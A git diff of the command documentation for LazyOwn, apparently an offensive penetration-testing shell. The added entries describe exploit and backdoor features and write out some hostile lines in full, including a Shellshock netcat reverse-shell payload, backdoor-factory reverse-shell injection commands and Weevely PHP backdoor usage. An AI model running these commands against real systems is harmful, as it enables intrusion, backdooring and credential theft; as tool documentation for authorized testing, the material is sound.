@@ -1,8 +1,5 @@
 # COMMANDS.md Documentation  by readmeneitor.py
 
-## xor_encrypt_decrypt
-XOR Encrypt or Decrypt data with a given key
-
 ## __init__
 Initializer for the LazyOwnShell class.
 
@@ -1073,12 +1070,15 @@ Note:
     - Parameters must be set before calling this function.
 
 ## lazymsfvenom
-Runs the `msfvenom` tool to generate payloads based on user input.
+Executes the `msfvenom` tool to generate a variety of payloads based on user input.
 
-Prompts the user to select a payload type from a list and executes the corresponding
-`msfvenom` command to generate a payload. Moves the generated payloads to a `sessions`
-directory and sets appropriate permissions. Optionally compresses the payloads using UPX
-and handles a C payload with shikata_ga_nai.
+This function prompts the user to select a payload type from a predefined list and runs the corresponding
+`msfvenom` command to create the desired payload. It handles tasks such as generating different types of
+payloads for Linux, Windows, macOS, and Android systems, including optional encoding with Shikata Ga Nai for C payloads.
+
+The generated payloads are moved to a `sessions` directory, where appropriate permissions are set. Additionally,
+the payloads can be compressed using UPX for space efficiency. If the selected payload is an Android APK,
+the function will also sign the APK and perform necessary post-processing steps.
 
 :param line: Command line arguments for the script.
 :return: None
@@ -1188,20 +1188,20 @@ Note:
     - Ensure proper exception handling to manage process interruptions.
 
 ## payload
-Load parameters from payload.json
+Load parameters from a specified payload JSON file.
 
-This function loads parameters from a JSON file named `payload.json` and updates the instance's `params` dictionary with the values from the file. If the file does not exist or contains invalid JSON, it will print an appropriate error message.
+This function loads parameters from a JSON file specified by the `line` argument and updates the instance's `params` dictionary with the values from the file. If the file does not exist or contains invalid JSON, it will print an appropriate error message.
 
 Usage:
-    payload
+    payload <filename>
 
-:param line: This parameter is not used in this function.
+:param line: The name of the JSON file to load.
 :type line: str
 
 :returns: None
 
 Manual execution:
-1. Open and read the `payload.json` file.
+1. Open and read the specified JSON file.
 2. Update the `params` dictionary with values from the JSON file.
 3. Print a success message if the parameters were successfully loaded.
 4. Handle `FileNotFoundError` if the file does not exist.
@@ -1211,10 +1211,10 @@ Dependencies:
 - `json` module for reading and parsing the JSON file.
 
 Example:
-    To execute the function, simply call `payload`.
+    To execute the function, call `payload payload_10.10.10.10.json`.
 
 Note:
-    - Ensure that `payload.json` exists in the current directory and is properly formatted.
+    - Ensure that the specified JSON file exists in the current directory and is properly formatted.
     - The confirmation message includes color formatting for better visibility.
 
 ## exit
@@ -1588,6 +1588,7 @@ Replace `<target_ip>` with the IP address of the target system. For example:
 Runs the `nikto` tool to perform a web server vulnerability scan against the specified target host.
 
 1. Executes `nikto` with the `-h` option to specify the target host IP address.
+2. Installs `nikto` if it is not already installed.
 
 :param line: This parameter is not used in the current implementation but could be used to specify additional options or arguments if needed.
 :param rhost: The IP address of the target web server, specified in the `params` dictionary.
@@ -2442,6 +2443,34 @@ Example:
 Note:
     Ensure that the `tun0` interface exists and has an IP address assigned. If `tun0` is not present or has no IP address, the clipboard will not be updated.
 
+## ipp
+Displays IP addresses of network interfaces and prints the IP address from the `tun0` interface.
+
+This function performs the following tasks:
+1. Displays IP addresses for all network interfaces using `ip a show scope global` and `awk`.
+2. Prints the IP address from the `tun0` interface.
+
+Usage:
+    ip
+
+:param line: This parameter is not used in the function but is included for consistency with other command methods.
+:type line: str
+:returns: None
+
+Manual execution:
+1. The command `ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "    [[96m" iface"[0m] "a[1] }'` is executed to display the IP addresses of all network interfaces.
+2. The IP address of the `tun0` interface is printed to the console using the command `ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1`.
+
+Dependencies:
+- The function relies on `awk`, `grep`, `cut`, and `xclip` to process and display the IP address.
+
+Example:
+    ip
+    # This will display IP addresses for all network interfaces and print the IP address from `tun0`.
+
+Note:
+    Ensure that the `tun0` interface exists and has an IP address assigned. If `tun0` is not present or has no IP address, the address will not be displayed.
+
 ## rhost
 Copies the remote host (rhost) to the clipboard and updates the command prompt.
 
@@ -2477,6 +2506,38 @@ Example:
 
 Note:
     Ensure that the `rhost` is valid by checking it with the `check_rhost` function before copying it to the clipboard.
+
+## rrhost
+Updates the command prompt to include the remote host (rhost) and current working directory.
+
+This function performs two tasks:
+1. It updates the command prompt to include the `rhost` and the current working directory if `line` is not 'clean'.
+2. It resets the command prompt to its default format if `line` is 'clean'.
+
+Usage:
+    rhost [clean]
+
+:param line: An optional argument that determines the behavior of the function:
+    - If 'clean', it resets the command prompt to its default format.
+    - If any other value, it updates the command prompt to include the `rhost` and current working directory.
+:type line: str
+:returns: None
+
+Manual execution:
+1. If `line` is 'clean':
+- The command prompt is reset to its default format.
+2. If `line` is any other value:
+- The command prompt is updated to show the `rhost` and the current working directory.
+
+Example:
+    rhost
+    # This will update the command prompt to include the `rhost` and current working directory.
+    
+    rhost clean
+    # This will reset the command prompt to its default format.
+
+Note:
+    Ensure that the `rhost` is valid by checking it with the `check_rhost` function before updating the prompt.
 
 ## banner
 Show the banner
@@ -4164,23 +4225,24 @@ Note:
 - The wordlist used by Skipfish is specified in `wordlist`.
 
 ## createdll
-Create a Windows DLL file using MinGW-w64.
+Create a Windows DLL file using MinGW-w64 or a Blazor DLL for Linux.
 
-This function prompts the user to select between creating a 32-bit 
-or 64-bit DLL. It checks if MinGW-w64 is installed, and if not, 
-it installs it. The user must provide a filename for the DLL, 
-which will be created from the `sessions/rev.c` source file. 
-The function constructs the appropriate command to compile 
-the DLL based on the user's choice and executes it. 
-It also opens the `rev.c` file in a text editor for any modifications 
-before compilation.
+This function prompts the user to select between creating a 32-bit DLL, 
+a 64-bit DLL, or a Linux Blazor DLL. It first checks if MinGW-w64 is installed; 
+if not, it attempts to install it. The user must provide a filename for the 
+DLL, which will be created from the `sessions/rev.c` source file. 
+The function constructs the appropriate command to compile the DLL based on 
+the user's choice and executes it. If the user selects a 32-bit or 64-bit 
+compilation, the function also opens the `rev.c` file in a text editor for 
+modifications before compilation. For option 3, it executes a script to create 
+a Blazor DLL using the local host (lhost) address to download the necessary payload.
 
 Parameters:
-- line (str): The name of the DLL file to be created. 
+- line (str): The name of the DLL file to be created.
             Must be provided by the user.
 
 Usage:
-- Choose "1" for 32-bit or "2" for 64-bit compilation.
+- Choose "1" for 32-bit, "2" for 64-bit, or "3" for creating a Linux Blazor DLL.
 - Ensure that shellcode is created beforehand using 
 the `lazymsfvenom` or `venom` options 13 or 14 
 to replace in `sessions/rev.c`.
@@ -4203,6 +4265,889 @@ Replace `<target_host>` with the URL or IP address of the web application you wa
 
 For example:
     lazyseo.py example.com
+
+## padbuster
+Execute the PadBuster command for padding oracle attacks.
+
+This function constructs and executes a PadBuster command to perform
+a padding oracle attack on the specified URL. It requires the user
+to provide a URL, a cookie with a hash, a plaintext value to compare, 
+and a specific byte position to attack.
+
+Parameters:
+- line (str): The input line containing the cookie, plaintext, and byte 
+            position. Expected format: 'cookie=<HASH> plaintext <byte_position>'.
+
+Functionality:
+- The function first checks if a URL is set in the parameters.
+- It then validates that the correct number of arguments is provided.
+- If the arguments are valid, it constructs the PadBuster command and executes it.
+- The command is also copied to the clipboard for convenience.
+
+Usage Example:
+- set url http://target.com
+- padbuster auth=<HASH> user=admin 8
+
+## smbattack
+Scans for hosts with SMB service open on port 445 in the specified target network.
+
+This function performs the following actions:
+1. Scans the specified subnet for hosts with an open SMB port (445).
+2. Sets up a Metasploit handler to listen for reverse connections.
+3. Attempts to exploit the Conficker vulnerability on each identified host.
+4. Optionally conducts a brute-force attack on SMB using the provided password file.
+
+Parameters:
+line (str): The command line input for the smbattack function, 
+            though not used directly in this implementation.
+
+Returns:
+None
+
+## cacti_exploit
+Automates the exploitation of the Cacti version 1.2.26 vulnerability 
+using the multi/http/cacti_package_import_rce exploit.
+
+This function performs the following actions:
+1. Sets up a Metasploit handler to listen for reverse connections.
+2. Attempts to log in to the Cacti instance with provided credentials.
+3. Checks if the target is vulnerable and uploads the malicious payload.
+4. Triggers the payload to obtain a Meterpreter session.
+
+Parameters:
+line (str): The command line input for the cacti exploit function, 
+            though used directly in this implementation to set password.
+
+Returns:
+None
+
+## smalldic
+Handles the creation of temporary files for users and passwords based on a small dictionary.
+
+This function prompts the user to decide whether to use a small dictionary for generating 
+user and password lists. If the user agrees, it loads the credentials from a JSON file and 
+writes them into temporary files. If the user declines, the process is aborted.
+
+Parameters:
+list (str): Not used in this function, but kept for compatibility with cmd command input.
+
+Returns:
+None
+
+## ngrok
+Set up and run ngrok on a specified local port. If ngrok is not installed, it will
+automatically be installed. The user will be prompted to provide their ngrok
+authentication token to complete the setup.
+
+Args:
+    line (str): The input line, though it's not directly used in this function.
+
+Workflow:
+1. Check if the local port specified in `self.params["lport"]` is valid.
+2. Verify if ngrok is installed. If not, proceed with installation.
+3. After installation, prompt the user to authenticate ngrok using their token.
+4. Once authenticated, run ngrok to expose the specified local port.
+
+Note:
+    The ngrok authentication token can be obtained from the ngrok dashboard.
+
+## wifipass
+This function generates a PowerShell script that retrieves saved Wi-Fi passwords on a Windows system.
+The script gathers the Wi-Fi profiles, extracts their passwords, and saves the information in a text file
+named 'wifi_passwords.txt' in the directory where the script is executed. The generated PowerShell command
+is copied to the clipboard for easy execution.
+
+Parameters:
+line (str): This parameter is not used within the function but is required for the command interface.
+
+The function does not return any value.
+
+## shellshock
+Executes a Shellshock attack against a target.
+
+This function constructs and sends a specially crafted HTTP request designed to exploit 
+the Shellshock vulnerability on a target server. The payload is embedded in the 
+'User-Agent' header, and when executed, it will open a reverse shell connection to 
+the attacker's machine.
+
+Parameters:
+- lport: Local port for the reverse shell connection, retrieved from self.params.
+- lhost: Local host for the reverse shell connection, retrieved from self.params.
+
+The function first validates the local host (lhost) and local port (lport) using 
+check_lhost() and check_lport(). If either validation fails, the function returns 
+without proceeding.
+
+If the validation passes, the payload is created using the format:
+'() { :; }; /bin/bash -c "nc -v {rhost} {lport} -e /bin/bash -i"',
+where rhost is the remote target's IP address and lport is the specified local port.
+
+The function then attempts to send a GET request to the target URL (args.target) 
+with the crafted payload in the 'User-Agent' header. The server's response is captured 
+and printed using print_msg().
+
+If any error occurs during the request, an error message is displayed using print_error().
+
+Returns:
+None
+
+## powerserver
+This function generates a PowerShell script that retrieves reverse shell over http on a Windows system.
+The script generated PowerShell reverse shell to execute command by curl command
+is copied to the clipboard for easy execution.
+
+Parameters:
+line (str): This parameter is used to get the port to create the listener
+
+The function does not return any value.
+Example of use: curl -X POST http://victim:8080/ -d "Get-Process"
+
+## morse
+Interactive Morse Code Converter.
+
+This function serves as an interface for converting text to Morse code and vice versa. 
+It provides a menu with the following options:
+
+1️⃣  Convert text to Morse code.
+2️⃣  Convert Morse code to text.
+0️⃣  Exit the program.
+
+When the function is called, it runs an external script (`morse.py`) that handles 
+the conversion processes. The function also manages keyboard interruptions 
+gracefully, allowing the user to exit the program cleanly.
+
+Arguments:
+line (str): This argument is reserved for future enhancements but is currently not used.
+
+Returns:
+None
+
+Notes:
+- Ensure that the `morse.py` module is located in the `modules` directory and is executable.
+- The function captures `KeyboardInterrupt` to allow safe exit from the Morse code converter.
+
+Example:
+>>> do_morse("")
+
+See Also:
+- `morse.py`: The script that contains the logic for Morse code conversions.
+
+## waybackmachine
+Fetch URLs from the Wayback Machine for a given website.
+The URL is taken from line. If the URL is not provided, an error is printed.
+The limit of results is taken from self.params["limit"] if provided; otherwise, defaults to 10.
+Results are printed directly to the console.
+
+## c2
+Handles the execution of a C2 (Command and Control) server setup command.
+
+This function performs the following tasks:
+1. Retrieves and validates the local host (lhost) and local port (lport) parameters.
+2. Checks if the required file `modules/run` exists.
+3. Reads the content of the `modules/run` file, replaces placeholders with actual values (lport, line, lhost), 
+and copies the updated content to the clipboard.
+4. Prompts the user to start the C2 server, and if confirmed, executes the server command.
+5. Provides a warning about shutting down the server.
+
+Args:
+    line (str): The victim ID or command line to be used by the C2 server.
+
+Returns:
+    None
+
+Raises:
+    None
+
+Example:
+    c2 victim-1
+
+Notes:
+    - Ensure that the `lhost` and `lport` parameters are valid before calling this function.
+    - The `modules/run` file must exist and be correctly formatted.
+    - The server command is executed using `os.system`, which may require additional handling for security.
+
+## kick
+Handles the process of sending a spoofed ARP packet to a specified IP address with a given MAC address.
+
+This function performs the following steps:
+1. Executes a command to list current ARP entries and prints the IP and MAC addresses.
+2. Prompts the user to input the target IP and MAC address in a specified format.
+3. Parses the provided input to extract the IP and MAC addresses.
+4. Sets up default values for the gateway IP, local MAC address, and network interface.
+5. Creates an ARP packet with the specified target IP and MAC address.
+6. Sends the ARP packet using the specified network interface.
+7. Prints a confirmation message indicating that the spoofing packet has been sent.
+
+Args:
+    line (str): Input line for the command, which is not used directly in this function.
+
+Raises:
+    Exception: If any error occurs during the execution of the function.
+
+## sqli
+Asks the user for the URL, database, table, and columns, and then executes the Python script 
+'modules/lazybsqli.py' with the provided parameters.
+
+Parameters:
+- def_func: Function to execute (not used in this example).
+- line: Command line or additional input (not used in this example).
+
+Example:
+- do_bsqli(None, None)
+
+## sshkey
+Generates an SSH key pair with RSA 4096-bit encryption. If no name is provided, it uses 'lazyown' by default.
+The keys are stored in the 'sessions/' directory.
+
+Parameters:
+- line: The name of the key file. If empty, 'lazyown' is used as the default.
+
+Example:
+- do_sshkey(None)  # Generates 'lazyown' key
+- do_sshkey("custom_key")  # Generates 'custom_key' key
+
+## crunch
+Generate a custom dictionary using the `crunch` tool.
+
+This function creates a wordlist with a specified length using the `crunch` command. 
+It allows the user to specify a custom character pattern for the wordlist.
+
+:param line: The length of the strings to be generated (e.g., '6' for 6-character strings).
+            If not provided, the function will prompt an error message.
+
+:returns: None
+
+Example usage:
+>>> crunch 6
+This will generate a wordlist with all possible combinations of 6-character strings using the default pattern.
+
+Additional notes:
+- If no custom pattern is provided, the function uses a default pattern: "0123456789abcdefghijklmnñopqrstuvxyz,.-#$%@"
+- The output is saved in the `sessions/` directory with the filename format `dict_<length>.txt`
+
+## malwarebazar
+Fetches and displays malware information from the MalwareBazaar API based on the given tag.
+
+Args:
+    line (str): The tag used to query the MalwareBazaar API.
+
+This function performs the following steps:
+1. Constructs a URL to query the MalwareBazaar API with the provided tag.
+2. Uses `curl` to send a POST request to the API and saves the response in a JSON file.
+3. Checks if the file was successfully created and exists.
+4. Loads the JSON data from the file.
+5. Checks the `query_status` field to determine if there are results.
+    - If `no_results`, prints a warning message and exits the function.
+6. Iterates through the list of file information provided in the response.
+    - Prints detailed information about each file, including:
+        - File name
+        - File type
+        - File size
+        - Hashes (SHA-256, SHA-1, MD5)
+        - First seen date
+        - Signature
+        - Tags
+        - ClamAV results (if any)
+        - Downloads and uploads count
+7. Deletes the temporary file used to store the API response.
+
+Returns:
+    None
+
+## download_malwarebazar
+Download a malware sample from MalwareBazaar using its SHA256 hash.
+
+This function allows the user to download a malware sample from MalwareBazaar by providing 
+the SHA256 hash of the desired file. If the hash is not provided as an argument, the function 
+will prompt an error message indicating the correct usage. The downloaded malware sample 
+will be saved as a zipped file (`malware.zip`) and will be password protected.
+
+Arguments:
+line (str): The SHA256 hash of the malware sample to be downloaded.
+
+Returns:
+None
+
+Example:
+>>> download_malwarebazar 094fd325049b8a9cf6d3e5ef2a6d4cc6a567d7d49c35f8bb8dd9e3c6acf3d78d
+
+Notes:
+- Ensure that the SHA256 hash provided is correct and that it corresponds to a file available 
+on MalwareBazaar.
+- The downloaded file will be password protected using the password "infected".
+- To obtain the SHA256 hash of malware samples, refer to the `help malwarebazar` command.
+
+See Also:
+- `run(command)`: Utility function used to execute the command for downloading the malware.
+
+## sslscan
+Run an SSL scan on the specified remote host.
+
+This function initiates an SSL scan on a specified remote host (`rhost`)
+using the `sslscan-singleip.sh` script. If a specific port is provided in the
+`line` argument, the scan will target that port; otherwise, it will scan
+all available ports.
+
+Parameters:
+line (str): The port number to scan (optional). If omitted, the scan will target all ports.
+
+Internal Variables:
+rhost (str): The remote host IP address or hostname extracted from the `params` attribute.
+
+Returns:
+None
+
+Example Usage:
+- To scan all ports on the specified `rhost`: `sslscan`
+- To scan a specific port (e.g., port 443) on `rhost`: `sslscan 443`
+
+Note:
+- The `check_rhost()` function is used to validate the `rhost` before running the scan.
+- The `sslscan-singleip.sh` script must be present in the `sessions` directory.
+
+## cewl
+This function constructs and executes a command for the 'cewl' tool.
+It first checks if the 'url' parameter is set. If not, it prints an error message.
+If the 'url' is set, it extracts the domain from the URL using the get_domain function.
+Then, it constructs a 'cewl' command with the specified parameters and prepares it for execution.
+
+Scan to a depth of 2 (-d 2) and use a minimum word length of 5 (-m 5), save the words to a file (-w docswords.txt), targeting the given URL (https://example.com):
+
+Parameters:
+line (str): The command line input for this function.
+
+Expected self.params keys:
+- url (str): The URL to be used for the 'cewl' command.
+
+Example usage:
+- set url http://example.com
+- do_cewl
+
+## dmitry
+This function constructs and executes a command for the 'dmitry' tool.
+It first checks if the 'url' parameter is set. If not, it prints an error message.
+If the 'url' is set, it extracts the domain from the URL using the get_domain function.
+Then, it constructs a 'dmitry' command with the specified parameters and prepares it for execution.
+
+Run a domain whois lookup (w), an IP whois lookup (i), retrieve Netcraft info (n), search for subdomains (s), search for email addresses (e), do a TCP port scan (p), and save the output to example.txt (o) for the domain example.com:
+
+Parameters:
+line (str): The command line input for this function.
+
+Expected self.params keys:
+- url (str): The URL to be used for the 'dmitry' command.
+
+Example usage:
+- set url http://example.com
+- do_dmitry
+
+## graudit
+Executes the graudit command to perform a static code analysis with the specified options.
+
+This function runs the 'graudit' tool with the '-A' option for an advanced scan and 
+the '-i sessions' option to include session files. The results will be displayed 
+directly in the terminal.
+
+Args:
+    line (str): Input line from the command interface. This argument is currently 
+                not used within the function but is required for the command 
+                interface structure.
+                
+Example:
+    To run this function from the command interface, simply type 'graudit' and press enter.
+    The function will execute the 'graudit -A -i sessions' command.
+
+Note:
+    Ensure that 'graudit' is installed and properly configured in your system's PATH 
+    for this function to work correctly.
+
+## msfrpc
+Connects to the msfrpcd daemon and allows remote control of Metasploit.
+
+Usage:
+    msfrpc -a <IP address> -p <port> -U <username> -P <password> [-S]
+
+This command will prompt the user for necessary information to connect to msfrpcd.
+
+## nuclei
+Executes a Nuclei scan on a specified target URL or host.
+
+Usage:
+    nuclei -u <URL> [-o <output file>] [other options]
+
+If a URL is provided as an argument, it will be used as the target for the scan.
+Otherwise, it will use the target specified in self.params["rhost"].
+
+## parsero
+Executes a parsero scan on a specified target URL or host.
+
+Usage:
+    parsero -u <URL> [-o <output file>] [other options]
+
+If a URL is provided as an argument, it will be used as the target for the scan.
+Otherwise, it will use the target specified in self.params["rhost"].
+
+## sherlock
+Executes the Sherlock tool to find usernames across social networks.
+
+This function takes a username as an argument and runs the Sherlock tool 
+to check for the username's presence on various social networks. The 
+results are saved in CSV format in the `sessions` directory.
+
+Parameters:
+line (str): The username to be checked by Sherlock. If not provided, an 
+            error message is printed and the function returns.
+
+Returns:
+None
+
+Raises:
+None
+
+Example:
+>>> do_sherlock("example_user")
+Running command: sherlock example_user --local -v --csv --print-found
+
+Additional Notes:
+- The Sherlock tool must be installed and available in the system path.
+- The results are saved in the `sessions` directory as a CSV file.
+- The `--local` flag forces the use of a local `data.json` file, 
+which should be present in the appropriate directory.
+
+## trufflehog
+Executes trufflehog to search for secrets in a given Git repository URL. 
+If trufflehog is not installed, it installs the tool automatically. 
+This function navigates to the 'sessions' directory and runs trufflehog 
+with the provided Git URL, outputting the results in JSON format.
+
+Args:
+    line (str): The Git repository URL to scan for secrets.
+
+Returns:
+    None
+
+Raises:
+    None
+
+Example:
+    trufflehog https://github.com/user/repo.git
+
+Notes:
+    - Ensure that trufflehog is installed or it will be installed automatically.
+    - The output of the trufflehog scan is printed and executed in the 'sessions' directory.
+
+## weevelygen
+Generate a PHP backdoor using Weevely, protected with the given password.
+
+This function generates a PHP backdoor file using the specified password. It ensures that Weevely is installed on the system before attempting to generate the backdoor. If Weevely is not present, it will be installed automatically. 
+
+Usage:
+┌─[LazyOwn👽127.0.0.1 ~/LazyOwn][10.10.10.10][http://victim.local/]
+└╼ $ weevelygen s3cr3t
+
+Parameters:
+line (str): The password to protect the generated PHP backdoor.
+
+Returns:
+None
+
+Raises:
+print_error: If the password argument is not provided.
+print_warn: If Weevely is not installed and needs to be installed.
+
+Example:
+To generate a PHP backdoor protected with the password 's3cr3t', use the following command:
+$ weevelygen s3cr3t
+
+## weevely
+Connect to PHP backdoor using Weevely, protected with the given password.
+
+This function Connect to PHP backdoor file using the specified password. It ensures that Weevely is installed on the system before attempting to generate the backdoor. If Weevely is not present, it will be installed automatically. 
+
+Usage:
+┌─[LazyOwn👽127.0.0.1 ~/LazyOwn][10.10.10.10][http://victim.local/]
+└╼ $ weevely http://victim.local/weevely.php s3cr3t
+
+Parameters:
+line (str): the url to Weevely shell and the password to protect the generated PHP backdoor.
+
+Returns:
+None
+
+Raises:
+print_error: If the password argument is not provided.
+print_warn: If Weevely is not installed and needs to be installed.
+
+Example:
+To generate a PHP backdoor protected with the password 's3cr3t', use the following command:
+$ weevelygen s3cr3t
+
+## changeme
+Executes a changeme scan on a specified target URL or host.
+
+Usage:
+    changeme [-o <output file>] --oa -t 20 rhost
+
+If a URL is provided as an argument, it will be used as the target for the scan.
+Otherwise, it will use the target specified in self.params["rhost"].
+
+## enum4linux_ng
+Performs enumeration of information from a target system using `enum4linux-ng`.
+
+1. Executes the `enum4linux-ng` command with the `-A` option to gather extensive information from the specified target.
+
+:param line: This parameter is not used in the current implementation but could be used to pass additional options or arguments if needed.
+:param rhost: The target host for enumeration, specified in the `params` dictionary.
+
+:returns: None
+
+Manual execution:
+To manually enumerate information from a system, use the following command:
+    enum4linu-ng -A <target_host>
+
+Replace `<target_host>` with the IP address or hostname of the target system.
+
+For example:
+    enum4linux-ng -A 192.168.1.10
+
+## fuzz
+Executes a web server fuzzing script with user-provided parameters.
+
+This function prompts the user for the necessary parameters to run the fuzzing script,
+including the target IP, port, HTTP method, directory, file extension, and expected status codes.
+
+Usage:
+    fuzzing
+
+Parameters:
+    line (str): The command line input for the function (not used directly in the current implementation).
+
+Returns:
+    None
+
+Example:
+    To run the fuzzing script, enter the required parameters when prompted by the function.
+
+## sharpshooter
+Executes a payload creation framework for the retrieval and execution of arbitrary CSharp source code.
+SharpShooter is capable of creating payloads in a variety of formats, including HTA, JS, VBS, and WSF.
+
+Usage:
+    sharpshooter [-o <output file>] --oa -t 20 rhost
+
+This function installs SharpShooter if it is not already installed, prompts the user for the payload type, 
+and then runs SharpShooter to create a payload based on the specified type.
+
+Parameters:
+    line (str): The command line input for the function (not used directly in the current implementation).
+
+Returns:
+    None
+
+Example:
+    To create a payload using SharpShooter, ensure you have already generated shellcode using lazymsfvenom or venom,
+    and then run this function to specify the payload type and generate the final payload file.
+
+## sliver_server
+Starts the Sliver server and generates a client configuration file for connecting clients.
+Provides options to download the Sliver client for Windows, Linux, or macOS.
+
+Usage:
+    sliver-server [flags]
+    sliver-client [command]
+
+This function installs Sliver if it is not already installed, starts the Sliver server,
+generates the necessary certificates, and creates a client configuration file. 
+It also provides options to download the client for different operating systems.
+
+Parameters:
+    line (str): The command line input for the function (not used directly in the current implementation).
+
+Returns:
+    None
+
+Example:
+    To start the Sliver server, generate the necessary certificates, and download the client,
+    run this function. Choose the appropriate client download option based on the operating system.
+
+## gencert
+Generates a certificate authority (CA), client certificate, and client key.
+
+Returns:
+    str: Paths to the generated CA certificate, client certificate, and client key.
+
+## kerbrute
+Executes the Kerbrute tool to enumerate user accounts against a specified target domain controller.
+
+This function performs the following actions:
+1. Retrieves necessary parameters such as the target URL and remote host (rhost).
+2. Determines the domain based on the provided URL.
+3. Validates the remote host address.
+4. Constructs and executes the Kerbrute command to enumerate user accounts, saving the results in the sessions/users.txt file.
+
+Parameters:
+line (str): Specify 'pass' to use credentials from 'credentials.txt' for password spraying, 'brute' to brute force using 'users.txt' and the RockYou wordlist, or leave empty for default behavior.
+
+Returns:
+None
+
+Example:
+To enumerate user accounts using Kerbrute, ensure Kerbrute is in your path, 
+then run this function to perform the enumeration.
+
+Note:
+- The function assumes that the Kerbrute binary (kerbrute_linux_amd64) is present in the system's PATH.
+- The file sessions/users.txt should exist and contain the list of usernames to enumerate.
+
+## dacledit
+Execute the dacledit.py command for a specific user or all users listed in the users.txt file.
+
+This function interacts with the DACL editor to modify access control lists in an Active Directory environment. 
+It allows the user to select a specific user from the list or execute the command for all users.
+Install impacket suit to get this script in the examples
+Args:
+    line (str): The organizational unit (OU) in the format 'OU=EXAMPLE,DC=DOMAIN,DC=EXT'. If not provided, the user is prompted to enter it.
+
+Returns:
+    None
+
+Workflow:
+    1. Extract parameters and set up paths.
+    2. Check the reachability of the remote host.
+    3. Prompt the user for an OU if not provided.
+    4. Check if the users.txt file exists and read the list of users.
+    5. Display the list of users and prompt the user to select a specific user.
+    6. Execute the dacledit.py command for the selected user or all users.
+
+Raises:
+    FileNotFoundError: If the users.txt file does not exist.
+
+Example:
+    To execute the command for a specific user:
+    >>> do_dacledit("MARKETING DIGITAL")
+
+    To execute the command for all users:
+    >>> do_dacledit("")
+
+## bloodyAD
+Execute the bloodyAD.py command for a specific user or all users listed in the users.txt file.
+
+This function interacts with BloodyAD to add users to a group in an Active Directory environment.
+It allows the user to select a specific user from the list or execute the command for all users.
+(use download_external option 48 to clone the repo)
+Args:
+    line (str): The organizational unit (OU) in the format 'CN=EXAMPLE,DC=DOMAIN,DC=EXT'. 
+                If not provided, the user is prompted to enter it.
+
+Returns:
+    None
+
+Workflow:
+    1. Extract parameters and set up paths.
+    2. Check the reachability of the remote host.
+    3. Prompt the user for a CN if not provided.
+    4. Check if the users.txt file exists and read the list of users.
+    5. Display the list of users and prompt the user to select a specific user.
+    6. Execute the bloodyAD.py command for the selected user or all users.
+
+Raises:
+    FileNotFoundError: If the users.txt file does not exist.
+
+Example:
+    To execute the command for a specific user:
+    >>> do_bloodyAD("")
+
+    To execute the command for all users:
+    >>> do_bloodyAD("")
+
+## evilwinrm
+Executes the Evil-WinRM tool to attempt authentication against the specified target.
+
+This function performs the following actions:
+1. Checks if the provided target host (`rhost`) is valid.
+2. If the `line` argument is "pass", it reads credentials from the `credentials.txt` file and attempts authentication for each user-password pair using Evil-WinRM.
+3. If `line` is not "pass", it prints an error message indicating the correct usage.
+
+Parameters:
+line (str): A command argument to determine the action. 
+            If "pass", the function reads credentials from the `credentials.txt` file and attempts to authenticate.
+            If not "pass", it prints an error message with usage instructions.
+
+Returns:
+None
+
+## getTGT
+Requests a Ticket Granting Ticket (TGT) using the Impacket tool with provided credentials.
+
+This function performs the following actions:
+1. Checks if the provided target host (`rhost`) is valid.
+2. Reads credentials from the `credentials.txt` file.
+3. Uses each credential (username and password) to request a TGT with the Impacket tool.
+4. Constructs and executes the Impacket command to obtain a TGT for each set of credentials.
+
+Parameters:
+line (str): A command line argument, not used in this implementation.
+
+Returns:
+None
+
+## apache_users
+Performs enumeration of users from a target system using `apache-users`.
+
+1. Executes the `apache-users` command with the `-h` option to specified target.
+
+:param line: This parameter is not used in the current implementation but could be used to pass additional options or arguments if needed.
+:param rhost: The target host for enumeration, specified in the `params` dictionary.
+
+:returns: None
+
+Manual execution:
+To manually enumerate information from a system, use the following command:
+    apache-users -h <target_host> -l <wordlist> -p <apache_port> -s 0 -e 403 -t 10
+
+Replace `<target_host>` with the IP address or hostname of the target system.
+
+For example:
+    apache-users -h 192.168.1.202 -l /usr/share/wordlists/metasploit/unix_users.txt -p 80 -s 0 -e 403 -t 10
+
+## backdoor_factory
+Creates a backdoored executable using `backdoor-factory`.
+
+This function checks if `backdoor-factory` is installed, installs it if necessary, and then uses it to 
+inject a reverse shell payload into a specified binary file. The binary is backdoored with a 
+reverse shell payload that connects back to a specified host and port.
+
+:param line: The absolute path to the file that will be backdoored. If not provided, the user is prompted 
+            to enter the path.
+
+:returns: None
+
+Manual execution:
+To manually create a backdoored executable, use the following command:
+    backdoor-factory -f <file_path> -H <lhost> -P <lport> -s reverse_shell_tcp_inline -J -a -c -l 128 -o <output_file>
+
+Replace `<file_path>` with the path to the binary you want to backdoor, `<lhost>` with the IP address of 
+the attacker’s machine, and `<lport>` with the port number to listen on. The `<output_file>` is the path 
+where the backdoored binary will be saved.
+
+For example:
+    backdoor-factory -f /usr/share/windows-binaries/plink.exe -H 192.168.1.202 -P 4444 -s reverse_shell_tcp_inline -J -a -c -l 128 -o sessions/backdoor_factory.exe
+
+## davtest
+Tests WebDAV server configurations using `davtest`.
+
+This function checks if `davtest` is installed and installs it if necessary. It then runs `davtest` 
+to perform a WebDAV server test against a specified URL or the default URL configured in `self.params`.
+
+:param line: The URL of the WebDAV server to test. If provided, it overrides the default URL. 
+            If not provided, the function uses the URL specified in `self.params["rhost"]`.
+
+:returns: None
+
+Manual execution:
+To manually test a WebDAV server, use the following command:
+    davtest --url <url>
+
+Replace `<url>` with the URL of the WebDAV server you want to test.
+
+For example:
+    davtest --url http://example.com/webdav
+
+## msfpc
+Generates payloads using MSFvenom Payload Creator (MSFPC).
+
+This function checks if `msfpc` is installed and installs it if necessary. It then runs `msfpc`
+with the specified parameters to create a payload for penetration testing.
+
+:param line: Not used in this implementation but reserved for future use.
+
+:returns: None
+
+Manual execution:
+To manually generate a payload using MSFPC, use the following command:
+    msfpc <TYPE> <DOMAIN/IP> <PORT> <CMD/MSF> <BIND/REVERSE> <STAGED/STAGELESS> <TCP/HTTP/HTTPS/FIND_PORT> <BATCH/LOOP> <VERBOSE>
+
+Replace the placeholders with the desired values. For example:
+    msfpc windows 192.168.1.10 4444 reverse stageless tcp verbose
+
+Example usage:
+    msfpc windows 192.168.1.10        # Windows & manual IP.
+    msfpc elf bind eth0 4444          # Linux, eth0's IP & manual port.
+    msfpc stageless cmd py https      # Python, stageless command prompt.
